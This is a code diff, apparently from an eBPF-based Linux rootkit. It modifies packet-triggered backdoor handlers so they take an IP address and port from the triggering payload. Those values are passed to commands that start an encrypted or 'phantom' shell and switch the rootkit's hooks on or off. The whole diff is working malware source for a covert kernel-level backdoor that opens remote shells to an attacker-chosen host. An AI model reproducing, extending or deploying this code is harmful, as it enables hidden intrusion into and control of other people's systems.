@@ -15,15 +15,15 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
     switch(command_received){
         case CC_PROT_COMMAND_ENCRYPTED_SHELL:
             bpf_printk("Received request to start encrypted connection\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received, ip, port);
             break;
         case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
             bpf_printk("Received request to activate all hooks\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received, ip, port);
             break;
         case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
             bpf_printk("Received request to deactivate all hooks\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received, ip, port);
             break;
         case CC_PROT_COMMAND_PHANTOM_SHELL:
             bpf_printk("Received request to start phantom shell\n");
@@ -301,8 +301,14 @@ backdoor_finish_v3_32:
         bpf_printk("FAIL CHECK 3\n");
         return 0;
     }
+
+    __u32 ip;
+    __u16 port;
+    __builtin_memcpy(&ip, payload+0x01, sizeof(__u32));
+    __builtin_memcpy(&port, payload+0x05, sizeof(__u16));
+
     bpf_printk("Completed backdoor trigger v3 (32bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received, 0, 0, NULL, 0);
+    execute_key_command(command_received, ip, port, NULL, 0);
 
     return 1;
 }
@@ -446,8 +452,14 @@ backdoor_finish_v3_16:
         bpf_printk("FAIL CHECK 3\n");
         return 0;
     }
+
+    __u32 ip;
+    __u16 port;
+    __builtin_memcpy(&ip, payload+0x01, sizeof(__u32));
+    __builtin_memcpy(&port, payload+0x05, sizeof(__u16));
+
     bpf_printk("Completed backdoor trigger v3 (16bit), b_data position: %i\n", b_data.last_packet_modified);
-    execute_key_command(command_received, 0, 0, NULL, 0);
+    execute_key_command(command_received, ip, port, NULL, 0);
 
     return 1;
 }
